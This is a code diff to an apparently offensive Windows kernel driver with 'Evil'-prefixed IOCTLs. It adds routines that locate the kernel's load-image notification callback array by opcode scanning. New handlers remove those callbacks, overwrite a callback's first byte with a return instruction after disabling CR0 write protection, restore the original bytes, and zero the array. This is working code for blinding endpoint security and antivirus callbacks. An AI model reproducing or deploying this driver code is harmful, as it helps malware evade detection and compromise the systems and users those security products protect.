@@ -14,6 +14,7 @@ NTSTATUS EvilRead(_In_ PDEVICE_OBJECT, _In_ PIRP Irp);
 KIRQL g_irql;
 UCHAR g_ProcessStoreAddress[0x320]; //8 byte array * 64 process callbacks
 UCHAR g_ThreadStoreAddress[0x320]; //8 byte array * 64 thread callbacks
+UCHAR g_LoadImageStoreAddress[0x320]; //8 byte array * 64 thread callbacks
 
 void CR0_WP_OFF_x64()
 {
@@ -162,7 +163,44 @@ ULONG64 FindPsSetCreateThreadNotifyRoutine()
 	KdPrint(("[+] PspSetCreateThreadNotifyRoutine is at address: %llx \n", pCheckArea));
 
 	for (i = pCheckArea; i < pCheckArea + 0xff; i++)
-	{	
+	{
+
+		if (*(PUCHAR)i == OPCODE_LEA_RCX_1[g_WindowsIndex] && *(PUCHAR)(i + 1) == OPCODE_LEA_RCX_2[g_WindowsIndex] && *(PUCHAR)(i + 2) == OPCODE_LEA_RCX_3[g_WindowsIndex])
+		{
+			OffsetAddr = 0;
+			memcpy(&OffsetAddr, (PUCHAR)(i + 3), 4);
+			return OffsetAddr + 7 + i;
+		}
+	}
+	return 0;
+}
+
+ULONG64 FindPsSetLoadImageNotifyRoutine()
+{
+	LONG OffsetAddr = 0;
+	ULONG64	i = 0;
+	ULONG64 pCheckArea = 0;
+	UNICODE_STRING unstrFunc;
+
+	RtlInitUnicodeString(&unstrFunc, L"PsSetLoadImageNotifyRoutine");
+	pCheckArea = (ULONG64)MmGetSystemRoutineAddress(&unstrFunc);
+	KdPrint(("[+] PsSetLoadImageNotifyRoutine is at address: %llx \n", pCheckArea));
+
+	for (i = pCheckArea; i < pCheckArea + 20; i++)
+	{
+		if ((*(PUCHAR)i == OPCODE_PSP[g_WindowsIndex]))
+		{
+			OffsetAddr = 0;
+			memcpy(&OffsetAddr, (PUCHAR)(i + 1), 4);
+			pCheckArea = pCheckArea + (i - pCheckArea) + OffsetAddr + 5;
+			break;
+		}
+	}
+
+	KdPrint(("[+] PspSetCreateThreadNotifyRoutine is at address: %llx \n", pCheckArea));
+
+	for (i = pCheckArea; i < pCheckArea + 0xff; i++)
+	{
 
 		if (*(PUCHAR)i == OPCODE_LEA_RCX_1[g_WindowsIndex] && *(PUCHAR)(i + 1) == OPCODE_LEA_RCX_2[g_WindowsIndex] && *(PUCHAR)(i + 2) == OPCODE_LEA_RCX_3[g_WindowsIndex])
 		{
@@ -372,6 +410,46 @@ NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
+	case IOCTL_EVIL_LOADIMAGE_DELETE_CALLBACK:
+	{
+		ULONG64	PspLoadImageNotifyRoutine = FindPsSetLoadImageNotifyRoutine();
+
+		if (!PspLoadImageNotifyRoutine)
+			return STATUS_SUCCESS;
+
+		int i = 0;
+		ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
+		if (data == nullptr)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		for (i = 0; i < 64; i++)
+		{
+			MagicPtr = PspLoadImageNotifyRoutine + i * 8;
+			NotifyAddr = *(PULONG64)(MagicPtr);
+			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+			{
+				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+				KdPrint(("[%d] LoadImageNotifyRoutine: %llx \n", i, NotifyAddr));
+
+				if (data->index == i)
+				{
+					status = PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)(NotifyAddr));
+					if (NT_SUCCESS(status))
+						KdPrint((DRIVER_PREFIX "Callback Removed!\n"));
+					else
+						KdPrint((DRIVER_PREFIX "Callback Remove Failed!\n"));
+					break;
+				}
+			}
+		}
+		break;
+	}
+
 	case IOCTL_EVIL_PROCESS_CALLBACK_RET:
 	{
 		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
@@ -480,6 +558,60 @@ NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
+	case IOCTL_EVIL_LOADIMAGE_CALLBACK_RET:
+	{
+		ULONG64	PspLoadImageNotifyRoutine = FindPsSetLoadImageNotifyRoutine();
+
+		if (!PspLoadImageNotifyRoutine)
+			return STATUS_SUCCESS;
+
+		int i = 0;
+		ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
+		if (data == nullptr)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		for (i = 0; i < 64; i++)
+		{
+			MagicPtr = PspLoadImageNotifyRoutine + i * 8;
+			NotifyAddr = *(PULONG64)(MagicPtr);
+			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+			{
+				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+				KdPrint(("[%d] LoadImageNotifyRoutine: %llx \n", i, NotifyAddr));
+
+				if (data->index == i)
+				{
+					int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);
+
+					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
+					{
+						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
+						CR0_WP_OFF_x64();
+						KeRevertToUserAffinityThreadEx(oldAffinity);
+					}
+
+					PULONG64 pPointer = (PULONG64)NotifyAddr;
+					memcpy((g_LoadImageStoreAddress + i * 8), pPointer, 8);
+					*pPointer = (ULONG64)0xc3;
+
+					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
+					{
+						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
+						CR0_WP_ON_x64();
+						KeRevertToUserAffinityThreadEx(oldAffinity);
+					}
+					break;
+				}
+			}
+		}
+		break;
+	}
+
 	case IOCTL_EVIL_PROCESS_ROLLBACK_RET:
 	{
 		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
@@ -518,7 +650,7 @@ NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					}
 
 					PULONG64 pPointer = (PULONG64)NotifyAddr;
-					memcpy(pPointer,(g_ProcessStoreAddress + i * 8),8);
+					memcpy(pPointer, (g_ProcessStoreAddress + i * 8), 8);
 
 					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
 					{
@@ -572,6 +704,59 @@ NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 					PULONG64 pPointer = (PULONG64)NotifyAddr;
 					memcpy(pPointer, (g_ThreadStoreAddress + i * 8), 8);
+
+					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
+					{
+						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
+						CR0_WP_ON_x64();
+						KeRevertToUserAffinityThreadEx(oldAffinity);
+					}
+					break;
+				}
+			}
+		}
+		break;
+	}
+
+	case IOCTL_EVIL_LOADIMAGE_ROLLBACK_RET:
+	{
+		ULONG64	PspLoadImageNotifyRoutine = FindPsSetLoadImageNotifyRoutine();
+
+		if (!PspLoadImageNotifyRoutine)
+			return STATUS_SUCCESS;
+
+		int i = 0;
+		ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
+		if (data == nullptr)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		for (i = 0; i < 64; i++)
+		{
+			MagicPtr = PspLoadImageNotifyRoutine + i * 8;
+			NotifyAddr = *(PULONG64)(MagicPtr);
+			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+			{
+				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+				KdPrint(("[%d] LoadImageNotifyRoutine: %llx \n", i, NotifyAddr));
+
+				if (data->index == i)
+				{
+					int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);
+
+					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
+					{
+						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
+						CR0_WP_OFF_x64();
+						KeRevertToUserAffinityThreadEx(oldAffinity);
+					}
+
+					PULONG64 pPointer = (PULONG64)NotifyAddr;
+					memcpy(pPointer, (g_LoadImageStoreAddress + i * 8), 8);
 
 					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
 					{
@@ -650,6 +835,43 @@ NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				{
 					NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
 					KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
+				}
+
+				if (data->remove)
+					*(PULONG64)(MagicPtr) = 0;
+			}
+		}
+
+		break;
+	}
+
+	case IOCTL_EVIL_LOADIMAGE_ZEROOUT_ARRAY:
+	{
+		ULONG64	PspLoadImageNotifyRoutine = FindPsSetLoadImageNotifyRoutine();
+
+		if (!PspLoadImageNotifyRoutine)
+			return STATUS_SUCCESS;
+
+		int i = 0;
+		ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
+		if (data == nullptr)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		for (i = 0; i < 64; i++)
+		{
+			MagicPtr = PspLoadImageNotifyRoutine + i * 8;
+			NotifyAddr = *(PULONG64)(MagicPtr);
+			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+			{
+				if (data->list)
+				{
+					NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+					KdPrint(("[%d] LoadImageNotifyRoutine: %llx \n", i, NotifyAddr));
 				}
 
 				if (data->remove)
@@ -748,14 +970,16 @@ NTSTATUS EvilRead(PDEVICE_OBJECT, PIRP Irp) {
 	}
 	else {
 		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
-		ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();
+		ULONG64	PspCreateThreadNotifyRoutine  = FindPsSetCreateThreadNotifyRoutine();
+		ULONG64	PspLoadImageNotifyRoutine     = FindPsSetLoadImageNotifyRoutine();
 
-		if (!PspCreateProcessNotifyRoutine & !PspCreateThreadNotifyRoutine)
+		if (!PspCreateProcessNotifyRoutine & !PspCreateThreadNotifyRoutine & !PspLoadImageNotifyRoutine)
 			return STATUS_SUCCESS;
 
 		ULONG64 i = 0;
 		ULONG64	NotifyAddr = 0, MagicPtr = 0;
 		ULONG64	NotifyAddr2 = 0, MagicPtr2 = 0;
+		ULONG64	NotifyAddr3 = 0, MagicPtr3 = 0;
 
 		for (i = 0; i < 64; i++)
 		{
@@ -818,6 +1042,45 @@ NTSTATUS EvilRead(PDEVICE_OBJECT, PIRP Irp) {
 					buffer += 32;
 
 					ModuleFound.ModuleBase = NotifyAddr2 - ModuleFound.ModuleBase;
+
+					::memcpy(buffer, (ULONG64*)&ModuleFound.ModuleBase, 8);
+					buffer += 8;
+
+					count = count + 8 + 32;
+				}
+				else
+				{
+					count += 16;
+					::memcpy(buffer, ModuleFound.ModuleName, 8);
+					buffer += 8;
+					::memset(buffer, 0, 8);
+					buffer += 8;
+				}
+			}
+		}
+
+		for (i = 0; i < 64; i++)
+
+		{
+			MagicPtr3 = PspLoadImageNotifyRoutine + i * 8;
+			NotifyAddr3 = *(PULONG64)(MagicPtr3);
+			if (MmIsAddressValid((PVOID)NotifyAddr3) && NotifyAddr3 != 0)
+			{
+				NotifyAddr3 = *(PULONG64)(NotifyAddr3 & 0xfffffffffffffff8);
+				KdPrint(("[%d] CreateThreadNotifyRoutine: %llx \n", i, NotifyAddr3));
+				count += 16;
+				::memcpy(buffer, (ULONG64*)&i, 8);
+				buffer += 8;
+				::memcpy(buffer, (ULONG64*)&NotifyAddr3, 8);
+				buffer += 8;
+
+				SearchModules(NotifyAddr3, &ModuleFound);
+				if (ModuleFound.ModuleBase != 0)
+				{
+					::memcpy(buffer, ModuleFound.ModuleName, sizeof(ModuleFound.ModuleName));
+					buffer += 32;
+
+					ModuleFound.ModuleBase = NotifyAddr3 - ModuleFound.ModuleBase;
 
 					::memcpy(buffer, (ULONG64*)&ModuleFound.ModuleBase, 8);
 					buffer += 8;
